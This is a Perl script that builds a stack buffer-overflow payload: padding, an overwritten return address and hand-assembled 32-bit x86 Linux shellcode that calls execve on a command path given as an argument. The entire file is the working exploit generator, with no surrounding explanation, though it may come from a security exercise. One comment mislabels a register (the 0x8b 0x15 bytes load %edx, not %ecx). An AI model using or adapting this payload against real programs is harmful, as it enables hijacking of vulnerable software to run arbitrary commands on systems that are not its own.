#!/usr/bin/perl

use strict;

my $frame_addr = unpack("N", pack("H*", $ARGV[0]));
my $cmd_path = $ARGV[1];

printf STDERR ("FRAME_ADDR=%08x\n", $frame_addr);
printf STDERR ("command=%s\n", $cmd_path);
                          
my $shell_code  = $frame_addr;
my $zero_data   = $frame_addr + 31;
my $cmd         = $zero_data + 4;
my $ptr_to_zero = $zero_data - 4;

print pack("C*", (0x33) x 24)  # Padding
    . pack("V*", $shell_code)  # Return address of the frame.
    . pack("C*", 0x31, 0xc0)   # xor %eax, %eax
    . pack("C*", 0xa3)         # mov %eax, ZERODATA
    . pack("V*", $zero_data)
    . pack("C*", 0xb0, 0x0b)   # mov $0xb, %al ; execve
    . pack("C*", 0xbb)         # mov CMD, %ebx
    . pack("V*", $cmd)
    . pack("C*", 0xb9)         # mov PTR_TO_ZERO, %ecx
    . pack("V*", $ptr_to_zero)
    . pack("C*", 0x8b, 0x15)   # mov ZERO_DATA, %ecx
    . pack("V*", $zero_data)
    . pack("C*", 0xcd, 0x80)   # int $80
    . pack("V*", $zero_data)   # PTR to ZERO_DATA
    . pack("C*", (0x55) x 4)   # DUMMY (ZERO_DATA)
    . "$cmd_path\n"
    ;
